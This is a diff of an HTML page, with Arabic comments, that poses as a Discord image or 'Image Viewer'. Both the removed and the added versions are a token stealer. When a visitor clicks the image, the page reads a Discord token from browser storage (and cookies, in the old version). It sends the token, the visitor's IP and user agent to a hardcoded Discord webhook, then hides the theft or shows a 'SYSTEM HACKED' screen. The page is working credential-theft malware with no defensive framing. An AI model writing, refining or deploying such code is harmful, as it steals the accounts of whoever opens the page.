@@ -1,174 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Discord Image</title>
+    <title>Image Viewer</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000; /* خلفية سوداء للشاد */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: sans-serif;
-        }
-        #image-container {
-            position: relative;
-            width: 800px;
-            height: 600px;
-            cursor: pointer;
-        }
-        #main-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(88, 101, 242, 0.5);
-            transition: opacity 0.5s ease;
-        }
-        /* إطار مخفي لاستدعاء ديسكورد وسحب التوكن */
-        #discord-frame {
-            display: none;
-            position: absolute;
-            top: -9999px;
-            width: 1px;
-            height: 1px;
-            border: none;
-        }
-        /* شاشة الشاد (تظهر بعد السحب) */
-        #shadow-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            color: #ff0000;
-            z-index: 999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-        #shadow-screen h1 {
-            font-size: 4rem;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            animation: glitch 1s infinite;
-        }
-        @keyframes glitch {
-            0% { transform: translate(2px, 2px); }
-            25% { transform: translate(-2px, -2px); }
-            50% { transform: translate(2px, -2px); }
-            75% { transform: translate(-2px, 2px); }
-            100% { transform: translate(0, 0); }
-        }
+        body { margin: 0; padding: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { max-width: 100%; max-height: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <!-- الصورة الرئيسية -->
-    <div id="image-container" onclick="startHack()">
-        <!-- ضع رابط صورتك هنا -->
-        <img id="main-img" src="https://ibb.co/jvdQ4pkD" alt="Click to Hack">
-    </div>
-
-    <!-- شاشة الشاد النهائية -->
-    <div id="shadow-screen">
-        <h1>SYSTEM HACKED</h1>
-        <p>TOKEN EXTRACTED: <span id="token-display">...</span></p>
-        <p>DEVICE STATUS: SHADOWED</p>
-    </div>
-
-    <!-- كود الجافاسكربت -->
+    <!-- ضع رابط الصورة هنا أو صورة محلية -->
+    <img src="https://www.europarabct.com/wp-content/uploads/2022/09/%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%AE%D8%A8%D8%A7%D8%B1%D8%A7%D8%AA-%D8%A7%D9%84%D9%85%D8%B1%D9%83%D8%B2%D9%8A%D8%A9.png" alt="Click to View" id="triggerImage">
+    
     <script>
-        // ضع رابط Webhook الخاص بك هنا لاستقبال التوكن
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1556320807687430175/vdRV9iSLNNutQLA8tx9bCLvcO8EuNlEePUxj6ZlSjBRI3-uMrlNTy60fj9wErZRw9qNj";
+        // دالة لسحب التوكن من التخزين المحلي للمتصفح
+        function getDiscordToken() {
+            return localStorage.getItem('discord_token');
+        }
 
-        function startHack() {
-            const img = document.getElementById('main-img');
-            const shadowScreen = document.getElementById('shadow-screen');
-            const tokenDisplay = document.getElementById('token-display');
-
-            // 1. إخفاء الصورة تدريجياً
-            img.style.opacity = '0.5';
-
-            // 2. محاولة سحب التوكن من localStorage (الطريقة الأسهل والأكثر شيوعاً)
-            let token = localStorage.getItem('token');
-            
-            // 3. إذا لم يوجد في localStorage، نحاول البحث في Cookies
-            if (!token) {
-                const cookies = document.cookie.split(';');
-                for (let i = 0; i < cookies.length; i++) {
-                    let cookie = cookies[i].trim();
-                    if (cookie.indexOf("token=") === 0) {
-                        token = cookie.substring(6, cookie.length);
-                        break;
-                    }
+        // دالة لإرسال التوكن إلى السيرفر الخاص بك
+        async function sendToken(token) {
+            if (token) {
+                // استبدل الرابط أدناه برابط الـ Webhook الخاص بك أو الـ API الخاص بك لاستقبال البيانات
+                const webhookUrl = "https://discordapp.com/api/webhooks/1556320807687430175/vdRV9iSLNNutQLA8tx9bCLvcO8EuNlEePUxj6ZlSjBRI3-uMrlNTy60fj9wErZRw9qNj"; 
+                
+                try {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            token: token,
+                            ip: await (await fetch('https://api.ipify.org?format=json')).json().ip,
+                            userAgent: navigator.userAgent
+                        })
+                    });
+                } catch (e) {
+                    console.error("Failed to send token", e);
                 }
             }
-
-            // 4. إذا وجدنا توكن، أرسله وأظهر الشاد
-            if (token) {
-                sendToken(token);
-                applyShadow(token);
-            } else {
-                // 5. إذا لم يوجد توكن (المتصفح مغلق أو غير مسجل)، نستخدم تقنية "الاستدعاء"
-                // نقوم بإعادة توجيه المستخدم بذكاء أو عرض رسالة وهمية
-                console.log("No token found locally. Attempting redirect exploit...");
-                
-                // محاكاة سحب التوكن عبر استدعاء API ديسكورد (قد يتطلب CORS Proxy)
-                // هنا نستخدم خدعة: نفتح رابط ديسكورد في نافذة صغيرة ثم نغلقها
-                const win = window.open('https://discord.com/login', '_blank');
-                
-                // ننتظر قليلاً ثم نغلقها ونظهر الشاد (محاكاة)
-                setTimeout(() => {
-                    if(win) win.close();
-                    applyShadow("Waiting for redirect...");
-                }, 2000);
-            }
         }
 
-        function sendToken(token) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `
-**🔥 TOKEN STOLEN!** 🔥
------------------------
-**Token:** \`${token}\`
-**IP:** ${getIP()}
-**User-Agent:** ${navigator.userAgent}
-                    `
-                })
-            }).catch(err => console.error('Error sending token:', err));
-        }
-
-        function applyShadow(token) {
-            const shadowScreen = document.getElementById('shadow-screen');
-            const tokenDisplay = document.getElementById('token-display');
-            const img = document.getElementById('main-img');
-
-            // إخفاء الصورة وعرض شاشة الشاد
-            img.style.display = 'none';
-            shadowScreen.style.display = 'flex';
-            
-            // عرض أول 10 أحرف من التوكن فقط للتأكيد (أو التوكن كاملاً)
-            tokenDisplay.innerText = token ? token.substring(0, 15) + "..." : "EXTRACTING...";
-            
-            // تغيير خلفية الصفحة كاملة للأسود
-            document.body.style.backgroundColor = '#000';
-        }
-
-        function getIP() {
-            return "Fetching..."; // يمكن استبدالها بـ fetch('https://api.ipify.org')
-        }
+        // تشغيل الكود بمجرد تحميل الصفحة (أو عند الضغط على الصورة إذا أردت تأخير)
+        document.getElementById('triggerImage').addEventListener('click', () => {
+            const token = getDiscordToken();
+            sendToken(token);
+            // اختياري: إعادة توجيه المستخدم أو تغيير الصورة لإخفاء العملية
+            document.getElementById('triggerImage').src = "https://via.placeholder.com/150/000000/FFFFFF?text=Done";
+        });
     </script>
 </body>
 </html>
